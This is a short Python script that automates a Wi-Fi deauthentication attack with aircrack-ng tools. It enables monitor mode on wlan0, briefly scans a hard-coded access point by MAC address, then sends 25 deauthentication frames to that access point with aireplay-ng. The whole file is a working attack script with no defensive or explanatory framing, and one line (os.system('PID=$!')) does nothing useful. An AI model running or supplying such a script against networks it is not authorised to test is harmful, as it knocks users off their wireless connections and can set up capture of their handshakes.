import os
import subprocess as sub
import time
from subprocess import check_call

def channelset():
    sub.call(['airmon-ng', 'start', 'wlan0'])
    p = sub.Popen(['airodump-ng', '-d', 'F4:F2:6D:3C:40:92', '-c', '1', 'wlan0mon'])
    time.sleep(2)
    p.kill()

def deauth():
    channelset()
    os.system("PID=$!")
    #os.system("kill PID")
    order = "aireplay-ng -0 25 -a F4:F2:6D:3C:40:92  wlan0mon"
    geny  = os.system(order)
    print(geny)
    return 1
    